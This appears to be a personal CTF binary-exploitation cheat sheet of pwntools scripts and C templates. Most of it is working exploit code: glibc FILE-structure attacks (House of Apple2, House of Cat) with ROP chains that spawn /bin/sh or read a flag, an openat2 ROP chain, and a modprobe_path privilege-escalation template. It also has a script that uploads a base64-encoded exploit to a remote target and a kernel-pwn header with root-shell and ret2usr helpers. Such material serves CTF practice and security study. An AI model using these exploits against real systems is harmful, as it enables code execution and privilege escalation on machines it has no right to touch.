# binsh apple2

```python
fake_io = heapbase + 0x320
IO_wfile_jumps=libcbase+libc.sym['_IO_wfile_jumps']
# setcontext_61=libcbase+libc.sym['setcontext']+61
# rdi=libcbase+next(libc.search(asm('pop rdi; ret;')))
# rax=libcbase+next(libc.search(asm('pop rax; ret;')))
# rsi=libcbase+next(libc.search(asm('pop rsi; ret;')))
# sys_ret=libcbase+next(libc.search(asm('syscall; ret;')))
# ret=rdi+1
saddr=libcbase+libc.sym['system']
binsh=libcbase+libc.search('/bin/sh').__next__()
# Rop=p64(rdi)+p64(binsh)+p64(saddr)
# orw=p64(setcontext_61)+p64(rdi)+p64(0xFFFFFF9C)
# 0x0    rdi             0x8   _IO_read_ptr
# 0x10  _IO_read_end     0x18  _IO_read_base
# 0x20  _IO_write_base   0x28  _IO_write_ptr
# 0x30  _IO_write_end    0x38  _IO_buf_base
# 0x40  _IO_buf_end      0x48  _IO_save_base
# 0x50  _IO_backup_base  0x58  _IO_save_end
# 0x60  _markers         0x68  _chain
# 0x70  _fileno          0x74  _flags2
# 0x78  _old_offset      0x80  _cur_column
# 0x82  _vtable_offset   0x83  _shortbuf
# 0x88  _lock            0x90  _offset
# 0x98  _codecvt         0xa0  _wide_data
# 0xa8  _freeres_list    0xb0  _freeres_buf
# 0xb8  __pad5           0xc0  _mode
# 0xc4  _unused2         0xd8  vtable
# magic:0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]

pay=flat(
{
    0x0:[b'/bin/sh\x00'],     # rdi = binsh
    0x20:[p64(0)],            # write_base
    0x28:[p64(1)],            # write_ptr --> ptr > base
    0x48:[p64(saddr)],
    0xc0:[p64(0)],            # _mode <= 0
    0xd8:[p64(IO_wfile_jumps+0x30)],

    0x88:[p64(fake_io+0x90),p64(0),p64(1)],   # bypass lock

    0xA0:[p64(fake_io-0x10)],         # bypass check in wfile_seekoff
    0x10:[p64(1)],
    0x18:[p64(0)],
    # (0xB0+0xd8):[p64(fake_io+0xB0+0xd8)], # fake wfile vtable
    (0xc8):[p64(fake_io+0xd0-0x18)],   
    (0xd0):[p64(fake_io+0x30)],   # call entry
    }, filler=b'\x00'
)
```

使用 _IO_wfile_jumps_maybe_mmap 表来执行 _IO_wfile_overflow 函数， 2.35， largebin attack模板

```python
from pwn import * 
filename = './heap2.35'
libc = ELF("./libc-2.35.so") 
host= ''
port= 0


sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

e = ELF(filename)
context.log_level='debug'
context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
context.terminal = ['tmux', 'splitw', '-h']
p = process(filename)

def dbg():
    cmds = """
        b _IO_wfile_overflow

    """
    gdb.attach(p, cmds)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')


def choice(ch):
    p.sendlineafter("choice:\n",str(ch))

def add(idx, size):
    choice(1)
    p.sendlineafter('idx:\n',str(idx))
    p.sendlineafter('size:\n',str(size))

def free(idx):
    choice(3)
    p.sendlineafter('idx:\n',str(idx))

def edit(idx, payload):
    choice(2)
    p.sendlineafter('idx:\n',str(idx))
    p.sendafter('content:\n',payload)

def show(idx):
    choice(4)
    p.sendlineafter('idx:\n',str(idx))

add(0, 0x520)
add(1, 0x500)
add(2, 0x510)

free(0)


add(3, 0x560)

show(0)
# libc_base = u64(p.recv(8))-0x203f50 2.39
libc_base = u64(p.recv(8)) - 0x21b110 # 2.35
p.recv(8)
heap_base = u64(p.recv(8))-0x290

free(2)

lg("libc_base")
lg("heap_base")

IO_list_all = libc_base + libc.sym['_IO_list_all']
fake_io_addr = heap_base + 0x290
lock = heap_base + 0x3000
_IO_wfile_jumps_maybe_mmap = libc_base + 0x216f40
setcontext = libc_base + libc.sym['setcontext'] + 61
leave = libc_base + 0x000000000004da83
ret = libc_base + 0x00000000000467c9
rdi = libc_base + 0x000000000002a3e5
rsi = libc_base + 0x000000000002be51
rdx_r12 = libc_base + 0x000000000011f2e7
rax = libc_base + 0x0000000000045eb0
mprotect = libc_base + libc.sym['mprotect']

pl =p64(0) + p64(0) + p64(0) + p64(IO_list_all-0x20)
pl+=p64(0)*2 + p64(0) + p64(fake_io_addr+0x10)
pl+=p64(0)*4
pl+=p64(0)*3 + p64(lock)
pl+=p64(0)*2 + p64(fake_io_addr+0xe0) + p64(0)
pl+=p64(0)*4
pl+=p64(0) + p64(_IO_wfile_jumps_maybe_mmap) 
pl+=p64(setcontext)
pl+=p64(0)*(0x7 + 0x14 - 8) + p64(fake_io_addr + 0x1c8) + p64(ret) + p64(0)*6 + p64(fake_io_addr + 0xe0 - 0x68)
pl+=p64(rdi) + p64(heap_base >> 12 << 12) + p64(rsi) + p64(0x2000) + p64(rdx_r12) + p64(7)*2 + p64(mprotect) + p64(0xdeadbeef)# shellcode_addr

edit(0, pl)

dbg()
add(4, 0x500)




p.interactive()
```

# 2.39 House of cat

_IO_flush_all->_IO_wfile_seekoff->_IO_switch_to_wget_mode, QWBS9 bph.

```python
from pwn import *
filename = './chall'
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
host= '47.95.4.104'
port= 34865


sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

e = ELF(filename)
context.log_level='debug'
context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
context.terminal = ['tmux', 'splitw', '-h']
p = process(filename)
# p = remote(host, port)

def dbg():
    cmds = """
# b *$rebase(0x1A8C  )
b *$rebase(0x1810   )
b _IO_wfile_seekoff
    """
    gdb.attach(p, cmds)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

def choice(idx):
    sla(b'Choice: ', str(idx))

def add(size, content):
    choice(1)
    sla(b'Size: ', str(size))
    sa(b'Content: ', content)

def delete(idx):
    choice(4)
    sla(b'Index: ', str(idx))

def view(content):
    sla(b'Index: ', content)


sa(b'Please input your token: ', b'a'*0x28)
p.recvuntil(b'a'*0x28)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0xaddae
lg("libc_base")

stdin_addr = libc_base + 0x2038e0



add(stdin_addr + 1 + 0x38 , b'a')# stdin->_IO_buf_base <= 0

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_wfile_jumps=libc_base+libc.sym['_IO_wfile_jumps']
fake_io_addr = libc_base + 0x205000 #一个可写的地址

# 不直接修改IO_list_all, 修改_IO_2_1_stderr_的chain为fake_io_addr


payload = b'a'*0x18 + p64(fake_io_addr) + p64(fake_io_addr+0x1000) + p64(0)*4
payload += p64(fake_io_addr)# _chain
sa(b'Choice: ', payload)


dbg()


pop_rdi = 0x000000000010f78b + libc_base
pop_rsi = 0x0000000000110a7d + libc_base
pop_rax = 0x00000000000dd237 + libc_base
pop_r13 = 0x00000000000584d9 + libc_base
mov_rdx_r13 = 0x00000000000b00d7 + libc_base
ret = pop_rdi + 1
flag_addr = fake_io_addr + 0x118
syscall = libc_base + 0x11ba8f
rop=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(libc_base+libc.symbols["open"])
rop += p64(pop_r13) + p64(0x100) + p64(mov_rdx_r13) + p64(0) * 4

rop+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["read"])
rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["write"])


# 0x00000000000584d9 : pop r13 ; ret
# 0x00000000000b00d7 : mov rdx, r13 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

# call_addr = libc_base + 0x04A99D # setcontext
call_addr = libc_base + libc.symbols["setcontext"] + 61

fake_IO_FILE = p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx setcontext rdi
fake_IO_FILE +=p64(call_addr) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(libc_base + 0x205700)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(libc_base+0x202258)# _IO_wfile_jumps+48
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40) + b"/flag\x00" # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0x88, b'\x00') + p64(0x40)

fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0xa0, b"\x00") + p64(fake_io_addr + 0xa0 + 0xb8) + p64(ret)

fake_flags = 0
fake_IO_read_ptr = 0
payload = p64(fake_flags) + p64(fake_IO_read_ptr) + fake_IO_FILE + rop

sa(b'Choice: ', payload)

p.interactive()

```

House of cat 2.41

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./main"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

def dbg():
    script = '''
        b _IO_flush_all
b *(&_IO_flush_all+210)
b _IO_switch_to_wget_mode
    '''
    if local:
        gdb.attach(p,script)
    pause()
def cmd(c):
    p.sendlineafter(b"Choice:", str(c).encode())
def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')



p.recvuntil('0x')
libcbase = int(p.recv(12), 16) - libc.sym['_IO_2_1_stdout_']
libc.address = libcbase
jump = libc.sym['_IO_file_jumps']
stdin = libc.sym['_IO_2_1_stdin_']
stdout = libc.sym['_IO_2_1_stdout_']
lg("stdout")

file = flat(
{
    0x0:0xfbad1800,
    0x8:[stdout + 0x801, stdout, stdout+0x800],
    0x20:[stdout, stdout - 0x800, stdout],
    0x68:stdout - 0x10,
    0x88:stdout + 0x1f0,
    0xb0:0,
    0xc8:jump-8,

    0x78:stdout + 0x1f0,
    0x90:stdout

}, filler = b'\x00'
)
pay = bytes(file)


dbg()
s(pay)

fake_io=stdout+0x100
IO_wfile_jumps=libc.sym['_IO_wfile_jumps']
saddr=libc.sym['system']
binsh=libc.search('/bin/sh').__next__()

magic=0x0000000000154720+libcbase
IO_wfile_jumps=libc.sym['_IO_wfile_jumps']
setcontext_61=libc.sym['setcontext']+53
rdi=libc.search(asm("pop rdi;ret"),executable=True).__next__()
rax=libc.search(asm("pop rax;ret"),executable=True).__next__()
rsi=libc.search(asm("pop rsi;ret"),executable=True).__next__()
sys_ret=libc.search(asm("syscall;ret"),executable=True).__next__()
ret=rdi +1
saddr=libc.sym['system']
Rop=p64(rdi)+p64(binsh)+p64(saddr)
orw=p64(setcontext_61)+p64(rdi)+p64(0xFFFFFF9C)
# 0x0    rdi             0x8   _IO_read_ptr
# 0x10  _IO_read_end     0x18  _IO_read_base
# 0x20  _IO_write_base   0x28  _IO_write_ptr
# 0x30  _IO_write_end    0x38  _IO_buf_base
# 0x40  _IO_buf_end      0x48  _IO_save_base
# 0x50  _IO_backup_base  0x58  _IO_save_end
# 0x60  _markers         0x68  _chain
# 0x70  _fileno          0x74  _flags2
# 0x78  _old_offset      0x80  _cur_column
# 0x82  _vtable_offset   0x83  _shortbuf
# 0x88  _lock            0x90  _offset
# 0x98  _codecvt         0xa0  _wide_data
# 0xa8  _freeres_list    0xb0  _freeres_buf
# 0xb8  __pad5           0xc0  _mode
# 0xc4  _unused2         0xd8  vtable
# magic:0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]

cat=flat(
{
0x0:[b'./flag.txt'],     # rdi=binsh
0x20:[p64(0)],            # write_base
0x28:[p64(1)],            # write_ptr --> ptr > base
0xc0:[p64(0)],            # _mode <= 0
0xd8:[p64(IO_wfile_jumps+0x30)],

0x88:[p64(fake_io+0x90),p64(0),p64(1)],   # bypass lock

0xA0:[p64(fake_io+0xA8),p64(0),p64(1)],
(0xA0+0x20):[p64(0)],
(0xA0+0x28):[p64(1)],            # bypass check in wfile_seekoff
(0xA0+0x30):[p64(1)],            # bypass check in wfile_seekoff
(0xB0+0xd8):[p64(fake_io+0xB0+0xd8)], # fake wfile vtable
(0xB0+0xd8+0x18):[p64(magic)],   # call entry
(0xB0+0xd8+0x18+0x20):[p64(fake_io+0xB0+0xd8+0x18+0x28)],
(0xB0+0xd8+0x18+0x48):[p64(setcontext_61)],
(0x1C8+0xA0):[p64(fake_io+0x280)],    # rsp
(0x1C8+0x68):[p64(0xffffff9c)],       # rdi
(0x1C8+0xA8):[p64(rax)],              # ret_addr
(0x1C8+0x88):[p64(0x100)],            # rdx
(0x1C8+0x70):[p64(fake_io)],          # rsi
(0x280):[p64(0x101),p64(sys_ret),            # rop
p64(rdi),p64(3),p64(rax),p64(0x0),p64(sys_ret),
p64(rax),p64(0x1),p64(rdi),p64(0x1),p64(sys_ret),
]
},filler=b'\x00')

file = flat(
{
    0x58:stdout + 0x100,
    0x88:stdout + 0x1f0,
    0xb0:0,
    0xc8:jump - 8,

    0x78:stdout + 0x1f0,
    0x90:fake_io

}, filler = b'\x00'
)

pay = bytes(file).ljust(0x100, b'\x00') + bytes(cat)
s(pay)

p.interactive()
```

2.35 QWB house of cat 用malloc_assert调用

```python

fake_io_addr = heap_base + 0x290
# ----------------------------------------------------------------------------------------#
pop_rdi = libc.search(asm("pop rdi;ret"),executable=True).__next__() + libc_base
pop_rsi = libc.search(asm("pop rsi;ret"),executable=True).__next__() + libc_base
pop_rax = libc.search(asm("pop rax;ret"),executable=True).__next__() + libc_base
pop_r13 = libc.search(asm("pop r13;ret"),executable=True).__next__() + libc_base
mov_rdx_r13 = 0x00000000000a80e3 + libc_base
ret = pop_rdi + 1
flag_addr = fake_io_addr + 0x118
sysall = libc_base + 0xea5b9
close = libc_base+libc.sym['close']
rop = flat(pop_rdi, 0, close)
rop += p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
rop += p64(pop_r13) + p64(64) + p64(mov_rdx_r13) + p64(0) * 4

rop+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["read"])
rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["write"])


# 0x00000000000584d9 : pop r13 ; ret
# 0x00000000000a80e3 : mov rdx, r13 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

# call_addr = libc_base + 0x04A99D # setcontext
call_addr = libc_base + libc.symbols["setcontext"] + 61
_IO_wfile_jumps = libc_base + libc.symbols["_IO_wfile_jumps"]


#这个模板的fake_IO_FILE不包括flags和_IO_read_ptr， 刚好放到堆里面
fake_IO_FILE = p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx setcontext rdi
fake_IO_FILE +=p64(call_addr) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_base)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10)# _IO_wfile_jumps+0x10, 这题用malloc_assert触发的，_IO_wfile_xsputn+0x10=_IO_wfile_seekoff
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40) + b"/flag\x00" # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0x88, b'\x00') + p64(0x40)

fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0xa0, b"\x00") + p64(fake_io_addr + 0xa0 + 0xb8) + p64(ret)

# ----------------------------------------------------------------------------------------#
IO_list_all = libc_base + libc.sym['_IO_list_all']
stderr = libc_base + 0x21a860
top_chunk = heap_base + 0x2500
add(0, 0x450, fake_IO_FILE+rop)

```

# 脚本模板

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./pwn"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)

def dbg():
    script = '''

    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

p.interactive()
```

openat2 rop

syscall ; ret 在libc的alarm函数里

参数设置：openat2(-100, flag_str, fake_struct, 0x18),  其中fake_struct中0x18长度都是0

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./baka"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libs/libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

def dbg():
    script = '''

    '''
    if local:
        gdb.attach(p,script)
    pause()
def cmd(c):
    p.sendlineafter(b"Choice:", str(c).encode())
def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

pop_rdi_rbp = 0x00000000004013ff
leave_ret = 0x00000000004012da
ret = 0x00000000004011f0
bss = 0x404100
puts_got = elf.got['puts']
puts = elf.sym['puts']

read1 = 0x401411          


payload = b'a'*64 + b'b'*8
payload += flat(pop_rdi_rbp, puts_got, bss + 0x40, puts, read1)

sla(b'Come n bite me :)\n', payload)

libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
lg("libc_base")

pop_rdi = libc_base + 0x0000000000023b6a
pop_rsi = libc_base + 0x000000000002601f
pop_rdx_r12 = libc_base + 0x0000000000119431
pop_rax = libc_base + 0x0000000000036174
syscall_ret = libc_base + 0xe2d99
mov_r10_rdx_jmp_rax = libc_base + 0x0000000000077f4b
dbg()
flag_str = bss
payload = b'/flag\x00\x00\x00' + b'a'*0x38 + b'b'*8
payload += flat(pop_rdi, -100, pop_rsi, flag_str,  pop_rdx_r12, 0x18, 0, 
    pop_rax, pop_rdx_r12, mov_r10_rdx_jmp_rax, flag_str+0x500, 0, pop_rax, 437, syscall_ret,
    pop_rdi, 3, pop_rsi, bss, pop_rdx_r12, 0x100, 0, pop_rax, 0, syscall_ret,
    pop_rdi, 1, pop_rsi, bss, pop_rdx_r12, 0x100, 0, pop_rax, 1, syscall_ret)
s(payload)

p.interactive()

# 0x0000000000077f4b : mov r10, rdx ; jmp rax



```

# kernel cheatsheat

打包

```bash
find . | cpio -o -H newc > ../initramfs.cpio
```

解包

```
#!/bin/bash 

mkdir initramfs
(cd initramfs && cpio -idv < ../initramfs.cpio)
```

```bash
gcc -static exp.c -o exp -lpthread
```

```c
void dump(void *buf) {
    size_t *bufz = (size_t *)buf;
    for (unsigned int i=0; i<(OBJECT_SIZE+7)>>3; ++i) {
        char ascii[9];
        for (int j=0; j<8; ++j) {
            uint8_t ch = (uint8_t)(bufz[i] >> j*8);
            ascii[j] = (char)(32 <= ch && ch <= 126 ? ch : '.');
        }
        ascii[8] = 0;
        printf("\x1b[34;1m0x%08x:\x1b[0m \x1b[33;1m0x%016lx\x1b[0m    /*  \x1b[90;1m%s\x1b[0m  */\n", i << 3, bufz[i], ascii);
    }
    printf("\n");
}
```

modprobe_path 模板

```c
    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

    OR


    int main(void) {
    setuid(0);
    if(getuid() == 0) {
        system("/bin/sh");
    }
    system("rm /tmp/dummy 2>/dev/null");
    system("rm /tmp/x 2>/dev/null");
    write_file("/tmp/x", "#!/bin/sh\n/bin/chown root:root /home/user/crasher\n/bin/chmod u+s /home/user/crasher");
    system("chmod 755 /tmp/x");
    write_file("/tmp/dummy", "\xff\xff\xff\xff");
    system("chmod 755 /tmp/dummy");
    kern_base = get_kern_base();
    printf("got kernel base leak: %p\n", kern_base);
    write_modprobe_path();
    system("/tmp/dummy 2>/dev/null");
    system("/home/user/crasher");
    getchar();
}
```

```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")

    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
```

```c
/**
 * @file kernel.h
 * @author arttnba3 (arttnba@gmail.com)
 * @brief arttnba3's personal utils for kernel pwn
 * @version 1.1
 * @date 2023-05-20
 * 
 * @copyright Copyright (c) 2023 arttnba3
 * 
 */
#ifndef A3_KERNEL_PWN_H
#define A3_KERNEL_PWN_H

#ifndef _GNU_SOURCE
  #define _GNU_SOURCE 
#endif

#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <poll.h>
#include <sched.h>

/**
 * I - fundamental functions
 * e.g. CPU-core binder, user-status saver, etc.
 */

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
size_t init_task, init_nsproxy, init_cred;

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;

    return vmemmap_base + page_count * 0x40;
}

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");

    system("/bin/sh");

    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

/* for ret2usr attacker */
void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds)
{
    void *(*prepare_kernel_cred_ptr)(void *) = 
                                         (void *(*)(void*)) prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = (int (*)(void*)) commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

/**
 * @brief create an isolate namespace
 * note that the caller **SHOULD NOT** be used to get the root, but an operator
 * to perform basic exploiting operations in it only
 */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/**
 * II - fundamental  kernel structures
 * e.g. list_head
 */
struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

